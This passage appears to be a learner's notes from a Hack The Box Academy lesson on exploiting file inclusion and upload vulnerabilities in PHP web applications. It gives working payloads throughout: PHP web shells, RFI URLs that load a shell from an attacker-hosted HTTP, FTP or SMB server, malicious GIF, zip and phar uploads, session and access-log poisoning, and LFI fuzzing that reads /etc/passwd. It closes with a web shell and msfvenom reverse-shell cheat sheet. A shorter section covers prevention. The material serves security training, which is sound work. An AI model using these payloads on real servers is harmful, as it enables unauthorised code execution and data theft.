	> As we can see, the index.php page got included in the vulnerable section (i.e. History Description), so the page is indeed vulnerable to RFI, as we are able to include URLs. Furthermore, the index.php page did not get included as source code text but got executed and rendered as PHP, so the vulnerable function also allows PHP execution, which may allow us to execute code if we include a malicious PHP script that we host on our machine.
	> We also see that we were able to specify port 80 and get the web application on that port. If the back-end server hosted any other local web applications (e.g. port 8080), then we may be able to access them through the RFI vulnerability by applying SSRF techniques on it.
	> Note: It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.

* Remote Code Execution with RFI
	> The first step in gaining remote code execution is creating a malicious script in the language of the web application, PHP in this case. We can use a custom web shell we download from the internet, use a reverse shell script, or write our own basic web shell as we did in the previous section, which is what we will do in this case:
		m1l0js@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
	> Now, all we need to do is host this script and include it through the RFI vulnerability. It is a good idea to listen on a common HTTP port like 80 or 443, as these ports may be whitelisted in case the vulnerable web application has a firewall preventing outgoing connections. Furthermore, we may host the script through an FTP service or an SMB service, as we will see next.

* HTTP
	> Now, we can start a server on our machine with a basic python server with the following command, as follows:
		m1l0js@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
	> Now, we can include our local shell through RFI, like we did earlier, but using <OUR_IP> and our <LISTENING_PORT>. We will also specify the command to be executed with &cmd=id:
		http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
	> As we can see, we did get a connection on our python server, and the remote shell was included, and we executed the specified command:
		m1l0js@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
			SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
	> Tip: We can examine the connection on our machine to ensure the request is being sent as we specified it. For example, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload

* FTP
	> As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python's pyftpdlib, as follows:
		m1l0js@htb[/htb]$ sudo python -m pyftpdlib -p 21
	> This may also be useful in case http ports are blocked by a firewall or the http:// string gets blocked by a WAF. To include our script, we can repeat what we did earlier, but use the ftp:// scheme in the URL, as follows:
		http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
	> As we can see, this worked very similarly to our http attack, and the command was executed. By default, PHP tries to authenticate as an anonymous user. If the server requires valid authentication, then the credentials can be specified in the URL, as follows:
		m1l0js@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
			...SNIP...
			uid=33(www-data) gid=33(www-data) groups=33(www-data)

* SMB
	> If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the allow_url_include setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.
	> We can spin up an SMB server using Impacket's smbserver.py, which allows anonymous authentication by default, as follows:
		m1l0js@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
	> Now, we can include our script by using a UNC path (e.g. \\<OUR_IP>\shell.php), and specify the command with (&cmd=whoami) as we did earlier:
		http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\shell.php&cmd=whoami
	> As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, we must note that this technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.



[+] LFI and File Uploads
	> File upload functionalities are ubiquitous in most modern web applications, as users usually need to configure their profile and usage of the web application by uploading their data. For attackers, the ability to store files on the back-end server may extend the exploitation of many vulnerabilities, like a file inclusion vulnerability.
	> The File Upload Attacks module covers different techniques on how to exploit file upload forms and functionalities. However, for the attack we are going to discuss in this section, we do not require the file upload form to be vulnerable, but merely allow us to upload files. If the vulnerable function has code Execute capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. image.jpg), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.
	> As mentioned in the first section, the following are the functions that allow executing code with file inclusion, any of which would work with this section's attacks:
		Function 			Read Content 		Execute 		Remote URL
		PHP 			
		include()/include_once() 	✅ 			✅ 			✅
		require()/require_once() 	✅ 			✅ 			❌
		NodeJS 			
		res.render() 			✅ 			✅ 			❌
		Java 			
		import 				✅ 			✅ 			✅
		.NET 			
		include 			✅ 			✅ 			✅
* Image upload
	> Image upload is very common in most modern web applications, as uploading images is widely regarded as safe if the upload function is securely coded. However, as discussed earlier, the vulnerability, in this case, is not in the file upload form but the file inclusion functionality.
	> Crafting Malicious Image
		- Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. shell.gif), and should also include the image magic bytes at the beginning of the file content (e.g. GIF8), just in case the upload form checks for both the extension and content type as well. We can do so as follows:
			m1l0js@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
		- This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.
		- Note: We are using a GIF image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type. The File Upload Attacks module goes more in depth for file type attacks, and the same logic can be applied here.
		- Now, we need to upload our malicious image file. To do so, we can go to the Profile Settings page and click on the avatar image to select our image, and then click on upload and our image should get successfully uploaded:

* Uploaded File Path
	> Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file. In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL:
		<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
	> Note: As we can see, we can use `/profile_images/shell.gif` for the file path. If we do not know where the file is uploaded, then we can fuzz for an uploads directory, and then fuzz for our uploaded file, though this may not always work as some web applications properly hide the uploaded files.
	> With the uploaded file path at hand, all we need to do is to include the uploaded file in the LFI vulnerable function, and the PHP code should get executed, as follows:
		http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
	> As we can see, we included our file and successfully executed the id command.
	> Note: To include to our uploaded file, we used ./profile_images/ as in this case the LFI vulnerability does not prefix any directories before our input. In case it did prefix a directory before our input, then we simply need to ../ out of that directory and then use our URL path, as we learned in previous sections.

* Zip Upload
	> As mentioned earlier, the above technique is very reliable and should work in most cases and with most web frameworks, as long as the vulnerable function allows code execution. There are a couple of other PHP-only techniques that utilize PHP wrappers to achieve the same goal. These techniques may become handy in some specific cases where the above technique does not work.
	> We can utilize the zip wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named shell.jpg), as follows:
	> Uploaded File Path
		m1l0js@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
	> Note: Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.
	> Once we upload the shell.jpg archive, we can include it with the zip wrapper as (zip://shell.jpg), and then refer to any files within it with #shell.php (URL encoded). Finally, we can execute commands as we always do with &cmd=id, as follows:
		http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
	> As we can see, this method also works in executing commands through zipped PHP scripts.
	> Note: We added the uploads directory (./profile_images/) before the file name, as the vulnerable page (index.php) is in the main directory.

* Phar Upload
	> Finally, we can use the phar:// wrapper to achieve a similar result. To do so, we will first write the following PHP script into a shell.php file:
		<?php
		$phar = new Phar('shell.phar');
		$phar->startBuffering();
		$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
		$phar->setStub('<?php __HALT_COMPILER(); ?>');
		
		$phar->stopBuffering();

	> This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with. We can compile it into a phar file and rename it to shell.jpg as follows:
	> Uploaded File Path
		m1l0js@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
	> Now, we should have a phar file called shell.jpg. Once we upload it to the web application, we can simply call it with phar:// and provide its URL path, and then specify the phar sub-file with /shell.txt (URL encoded) to get the output of the command we specify with (&cmd=id), as follows:
		http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
	> As we can see, the id command was successfully executed. Both the zip and phar wrapper methods should be considered as alternative methods in case the first method did not work, as the first method we discussed is the most reliable among the three.
	> Note: There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the phpinfo() page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()). If you are interested in knowing more about it, you can refer to This Link => (https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf)


[+] Log Poisoning 
	> We have seen in previous sections that if we include any file that contains PHP code, it will get executed, as long as the vulnerable function has the Execute privileges. The attacks we will discuss in this section all rely on the same concept: Writing PHP code in a field we control that gets logged into a log file (i.e. poison/contaminate the log file), and then include that log file to execute the PHP code. For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.
	> As was the case in the previous section, any of the following functions with Execute privileges should be vulnerable to these attacks:
		Function 			Read Content 	Execute 	Remote URL
		PHP 			
		include()/include_once() 	✅ 		✅ 		✅
		require()/require_once() 	✅ 		✅ 		❌
		NodeJS 			
		res.render() 			✅ 		✅ 		❌
		Java 			
		import 				✅ 		✅ 		✅
		.NET 			
		include 			✅ 		✅ 		✅

* PHP Session Poisoning
	> Most PHP web applications utilize PHPSESSID cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows. The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.
	> The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison. So, let's first check if we have a PHPSESSID cookie set to our session: image
	> As we can see, our PHPSESSID cookie value is nhhv8i0o6ua4g88bkdl9u1fdsd, so it should be stored at /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd. Let's try include this session file through the LFI vulnerability and view its contents: => (https://academy.hackthebox.com/storage/modules/23/rfi_session_include.png)
		http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
	> Note: As you may easily guess, the cookie value will differ from one session to another, so you need to use the cookie value you find in your own session to perform the same attack.
	> We can see that the session file contains two values: page, which shows the selected language page, and preference, which shows the selected language. The preference value is not under our control, as we did not specify it anywhere and must be automatically specified. However, the page value is under our control, as we can control it through the ?language= parameter.
	> Let's try setting the value of page a custom value (e.g. language parameter) and see if it changes in the session file. We can do so by simply visiting the page with ?language=session_poisoning specified, as follows:
		http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
	> Now, let's include the session file once again to look at the contents:
		http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
	> This time, the session file contains session_poisoning instead of es.php, which confirms our ability to control the value of page in the session file. Our next step is to perform the poisoning step by writing PHP code to the session file. We can write a basic PHP web shell by changing the ?language= parameter to a URL encoded web shell, as follows:
		http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
	> Finally, we can include the session file and use the &cmd=id to execute a commands:
		http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
	> Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.

* Server Log Poisoning
	> Both Apache and Nginx maintain various log files, such as access.log and error.log. The access.log file contains various information about all requests made to the server, including each request's User-Agent header. As we can control the User-Agent header in our requests, we can use it to poison the server logs as we did above.
	> Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. Nginx logs are readable by low privileged users by default (e.g. www-data), while the Apache logs are only readable by users with high privileges (e.g. root/adm groups). However, in older or misconfigured Apache servers, these logs may be readable by low-privileged users.
	> By default, Apache logs are located in /var/log/apache2/ on Linux and in C:\xampp\apache\logs\ on Windows, while Nginx logs are located in /var/log/nginx/ on Linux and in C:\nginx\log\ on Windows. However, the logs may be in a different location in some cases, so we may use an LFI Wordlist(https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations, as will be discussed in the next section.
	> So, let's try including the Apache access log from /var/log/apache2/access.log, and see what we get:
		http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
	> As we can see, we can read the log. The log contains the remote IP address, request page, response code, and the User-Agent header. As mentioned earlier, the User-Agent header is controlled by us through the HTTP request headers, so we should be able to poison this value.
	> Tip: Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.
	> To do so, we will use Burp Suite to intercept our earlier LFI request and modify the User-Agent header to Apache Log Poisoning: image
	> Note: As all requests to the server get logged, we can poison any request to the web application, and not necessarily the LFI one as we did above.
	> As expected, our custom User-Agent value is visible in the included log file. Now, we can poison the User-Agent header by setting it to a basic PHP web shell: image
	> We may also poison the log by sending a request through cURL, as follows:
		m1l0js@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'
	> As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (?cmd=id): image
		http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
		(https://academy.hackthebox.com/storage/modules/23/rfi_id_repeater.png)
	> We see that we successfully executed the command. The exact same attack can be carried out on Nginx logs as well.
	> Tip: The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.
	> Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:
    		- /var/log/sshd.log
    		- /var/log/mail
    		- /var/log/vsftpd.log
	> We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the ssh or ftp services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the mail services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.

[+] Automated Scanning
	> It is essential to understand how file inclusion attacks work and how we can manually craft advanced payloads and use custom techniques to reach remote code execution. This is because in many cases, for us to exploit the vulnerability, it may require a custom payload that matches its specific configurations. Furthermore, when dealing with security measures like a WAF or a firewall, we have to apply our understanding to see how a specific payload/character is being blocked and attempt to craft a custom payload to work around it.
	> We may not need to manually exploit the LFI vulnerability in many trivial cases. There are many automated methods that can help us quickly identify and exploit trivial LFI vulnerabilities. We can utilize fuzzing tools to test a huge list of common LFI payloads and see if any of them work, or we can utilize specialized LFI tools to test for such vulnerabilities. This is what we will discuss in this section.

* Fuzzing Parameters
	> The HTML forms users can use on the web application front-end tend to be properly tested and well secured against different web attacks. However, in many cases, the page may have other exposed parameters that are not linked to any HTML forms, and hence normal users would never access or unintentionally cause harm through. This is why it may be important to fuzz for exposed parameters, as they tend not to be as secure as public ones.
	> For example, we can fuzz the page for common GET parameters, as follows:
		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
			language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
	> Once we identify an exposed parameter that isn't linked to any forms we tested, we can perform all of the LFI tests discussed in this module. This is not unique to LFI vulnerabilities but also applies to most web vulnerabilities discussed in other modules, as exposed parameters may be vulnerable to any other vulnerability as well.
	> Tip: For a more precise scan, we can limit our scan to the most popular LFI parameters found on this link. => (https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters)

* LFI wordlists
	> So far in this module, we have been manually crafting our LFI payloads to test for LFI vulnerabilities. This is because manual testing is more reliable and can find LFI vulnerabilities that may not be identified otherwise, as discussed earlier. However, in many cases, we may want to run a quick test on a parameter to see if it is vulnerable to any common LFI payload, which may save us time in web applications where we need to test for various vulnerabilities.
	> There are a number of LFI Wordlists(https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) we can use for this scan. A good wordlist is LFI-Jhaddix.txt(https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), as it contains various bypasses and common files, so it makes it easy to run several tests at once. We can use this wordlist to fuzz the ?language= parameter we have been testing throughout the module, as follows:
		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
			..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
			../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
			...SNIP...
			../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
			../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
			../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
			..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
			/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
	> As we can see, the scan yielded a number of LFI payloads that can be used to exploit the vulnerability. Once we have the identified payloads, we should manually test them to verify that they work as expected and show the included file content.

* Fuzzing Server Files
	> In addition to fuzzing LFI payloads, there are different server files that may be helpful in our LFI exploitation, so it would be helpful to know where such files exist and whether we can read them. Such files include: Server webroot path, server configurations file, and server logs.
+ Server Webroot
	> We may need to know the full server webroot path to complete our exploitation in some cases. For example, if we wanted to locate a file we uploaded, but we cannot reach its /uploads directory through relative paths (e.g. ../../uploads). In such cases, we may need to figure out the server webroot path so that we can locate our uploaded files through absolute paths instead of relative paths.
	> To do so, we can fuzz for the index.php file through common webroot paths, which we can find in this wordlist for Linux(https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this wordlist for Windows(https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Depending on our LFI situation, we may need to add a few back directories (e.g. ../../../../), and then add our index.php afterwords.
	> The following is an example of how we can do all of this with ffuf:
		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
			/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
	> As we can see, the scan did indeed identify the correct webroot path at (/var/www/html/). We may also use the same LFI-Jhaddix.txt wordlist we used earlier, as it also contains various payloads that may reveal the webroot. If this does not help us in identifying the webroot, then our best choice would be to read the server configurations, as they tend to contain the webroot and other important information, as we'll see next.

+ Server Logs/Configurations
	> As we have seen in the previous section, we need to be able to identify the correct logs directory to be able to perform the log poisoning attacks we discussed. Furthermore, as we just discussed, we may also need to read the server configurations to be able to identify the server webroot path and other important information (like the logs path!).
	> To do so, we may also use the LFI-Jhaddix.txt wordlist, as it contains many of the server logs and configuration paths we may be interested in. If we wanted a more precise scan, we can use this wordlist for Linux(https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this wordlist for Windows(https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), though they are not part of seclists, so we need to download them first. Let's try the Linux wordlist against our LFI vulnerability, and see what we get:
		m1l0js@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
			/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
			/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
			/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
			/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
			/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
			/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
			...SNIP...
			/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
			/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
			/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
			/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
	> As we can see, the scan returned over 60 results, many of which were not identified with the LFI-Jhaddix.txt wordlist, which shows us that a precise scan is important in certain cases. Now, we can try reading any of these files to see whether we can get their content. We will read (/etc/apache2/apache2.conf), as it is a known path for the apache server configuration:
		m1l0js@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
			...SNIP...
			        ServerAdmin webmaster@localhost
			        DocumentRoot /var/www/html
			
			        ErrorLog ${APACHE_LOG_DIR}/error.log
			        CustomLog ${APACHE_LOG_DIR}/access.log combined
			...SNIP...
			
	> As we can see, we do get the default webroot path and the log path. However, in this case, the log path is using a global apache variable (APACHE_LOG_DIR), which are found in another file we saw above, which is (/etc/apache2/envvars), and we can read it to find the variable values:
		m1l0js@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
			...SNIP...
			export APACHE_RUN_USER=www-data
			export APACHE_RUN_GROUP=www-data
			# temporary state file location. This might be changed to /run in Wheezy+1
			export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
			export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
			export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
			# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
			export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
			...SNIP...
	> As we can see, the (APACHE_LOG_DIR) variable is set to (/var/log/apache2), and the previous configuration told us that the log files are /access.log and /error.log, which have accessed in the previous section.
	> Note: Of course, we can simply use a wordlist to find the logs, as multiple wordlists we used in this sections did show the log location. But this exercises shows us how we can manually go through identified files, and then use the information we find to further identify more files and important information. This is quite similar to when we read different file sources in the PHP filters section, and such efforts may reveal previously unknown information about the web application, which we can use to further exploit it.

* LFI Tools
Finally, we can utilize a number of LFI tools to automate much of the process we have been learning, which may save time in some cases, but may also miss many vulnerabilities and files we may otherwise identify through manual testing. The most common LFI tools are LFISuite(https://github.com/D35m0nd142/LFISuite), LFiFreak(https://github.com/OsandaMalith/LFiFreak), and liffy(https://github.com/mzfr/liffy). We can also search GitHub for various other LFI tools and scripts, but in general, most tools perform the same tasks, with varying levels of success and accuracy.

Unfortunately, most of these tools are not maintained and rely on the outdated python2, so using them may not be a long term solution. Try downloading any of the above tools and test them on any of the exercises we've used in this module to see their level of accuracy.


[+] File Inclusion Prevention
	> This module has discussed various ways to detect and exploit file inclusion vulnerabilities, along with different security bypasses and remote code execution techniques we can utilize. With that understanding of how to identify file inclusion vulnerabilities through penetration testing, we should now learn how to patch these vulnerabilities and harden our systems to reduce the chances of their occurrence and reduce the impact if they do.

* File Inclusion Prevention
	> The most effective thing we can do to reduce file inclusion vulnerabilities is to avoid passing any user-controlled inputs into any file inclusion functions or APIs. The page should be able to dynamically load assets on the back-end, with no user interaction whatsoever. Furthermore, in the first section of this module, we discussed different functions that may be utilized to include other files within a page and mentioned the privileges each function has. Whenever any of these functions is used, we should ensure that no user input is directly going into them. Of course, this list of functions is not comprehensive, so we should generally consider any function that can read files.
	> In some cases, this may not be feasible, as it may require changing the whole architecture of an existing web application. In such cases, we should utilize a limited whitelist of allowed user inputs, and match each input to the file to be loaded, while having a default value for all other inputs. If we are dealing with an existing web application, we can create a whitelist that contains all existing paths used in the front-end, and then utilize this list to match the user input. Such a whitelist can have many shapes, like a database table that matches IDs to files, a case-match script that matches names to files, or even a static json map with names and files that can be matched.
	> Once this is implemented, the user input is not going into the function, but the matched files are used in the function, which avoids file inclusion vulnerabilities.

* Preventing Directory Traversal
	> If attackers can control the directory, they can escape the web application and attack something they are more familiar with or use a universal attack chain. As we have discussed throughout the module, directory traversal could potentially allow attackers to do any of the following:
    		- Read /etc/passwd and potentially find SSH Keys or know valid user names for a password spray attack
    		- Find other services on the box such as Tomcat and read the tomcat-users.xml file
    		- Discover valid PHP Session Cookies and perform session hijacking
    		- Read current web application configuration and source code
	> The best way to prevent directory traversal is to use your programming language's (or framework's) built-in tool to pull only the filename. For example, PHP has basename(), which will read the path and only return the filename portion. If only a filename is given, then it will return just the filename. If just the path is given, it will treat whatever is after the final / as the filename. The downside to this method is that if the application needs to enter any directories, it will not be able to do it.
	> If you create your own function to do this method, it is possible you are not accounting for a weird edge case. For example, in your bash terminal, go into your home directory (cd ~) and run the command cat .?/.*/.?/etc/passwd. You'll see Bash allows for the ? and * wildcards to be used as a .. Now type php -a to enter the PHP Command Line interpreter and run echo file_get_contents('.?/.*/.?/etc/passwd');. You'll see PHP does not have the same behaviour with the wildcards, if you replace ? and * with ., the command will work as expected. This demonstrates there is an edge cases with our above function, if we have PHP execute bash with the system() function, the attacker would be able to bypass our directory traversal prevention. If we use native functions to the framework we are in, there is a chance other users would catch edge cases like this and fix it before it gets exploited in our web application.
	> Furthermore, we can sanitize the user input to recursively remove any attempts of traversing directories, as follows:
		while(substr_count($input, '../', 0)) {
		    $input = str_replace('../', '', $input);
		};
	> As we can see, this code recursively removes ../ sub-strings, so even if the resulting string contains ../ it would still remove it, which would prevent some of the bypasses we attempted in this module.

* Web Server Configuration
	> Several configurations may also be utilized to reduce the impact of file inclusion vulnerabilities in case they occur. For example, we should globally disable the inclusion of remote files. In PHP this can be done by setting allow_url_fopen and allow_url_include to Off.
	> It's also often possible to lock web applications to their web root directory, preventing them from accessing non-web related files. The most common way to do this in today's age is by running the application within Docker. However, if that is not an option, many languages often have a way to prevent accessing files outside of the web directory. In PHP that can be done by adding open_basedir = /var/www in the php.ini file. Furthermore, you should ensure that certain potentially dangerous modules are disabled, like PHP Expect mod_userdir.
	> If these configurations are applied, to should prevent accessing files outside the web application folder, so even if an LFI vulnerability is identified, its impact would be reduced.

* Web Application Firewall (WAF)
	> The universal way to harden applications is to utilize a Web Application Firewall (WAF), such as ModSecurity. When dealing with WAFs, the most important thing to avoid is false positives and blocking non-malicious requests. ModSecurity minimizes false positives by offering a permissive mode, which will only report things it would have blocked. This lets defenders tune the rules to make sure no legitimate request is blocked. Even if the organization never wants to turn the WAF to "blocking mode", just having it in permissive mode can be an early warning sign that your application is being attacked.
	> Finally, it is important to remember that the purpose of hardening is to give the application a stronger exterior shell, so when an attack does happen, the defenders have time to defend. According to the FireEye M-Trends Report of 2020, the average time it took a company to detect hackers was 30 days. With proper hardening, attackers will leave many more signs, and the organization will hopefully detect these events even quicker.
	> It is important to understand the goal of hardening is not to make your system un-hackable, meaning you cannot neglect watching logs over a hardened system because it is "secure". Hardened systems should be continually tested, especially after a zero-day is released for a related application to your system (ex: Apache Struts, RAILS, Django, etc.). In most cases, the zero-day would work, but thanks to hardening, it may generate unique logs, which made it possible to confirm whether the exploit was used against the system or not.

-=-=-=-=-
[+] File upload attacks
## Web Shells

| **Web Shell**   | **Description**   |
| --------------|-------------------|
| `<?php file_get_contents('/etc/passwd'); ?>` | Basic PHP File Read |
| `<?php system('hostname'); ?>` | Basic PHP Command Execution |
| `<?php system($_REQUEST['cmd']); ?>` | Basic PHP Web Shell |
| `<% eval request('cmd') %>` | Basic ASP Web Shell |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate PHP reverse shell |
| [PHP Web Shell](https://github.com/Arrexel/phpbash) | PHP Web Shell |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell) | PHP Reverse Shell |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |

## Bypasses

| **Command**   | **Description**   |
| --------------|-------------------|
| **Client-Side Bypass** |
| `[CTRL+SHIFT+C]` | Toggle Page Inspector |
| **Blacklist Bypass** |
| `shell.phtml` | Uncommon Extension |
| `shell.pHp` | Case Manipulation |
| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions |
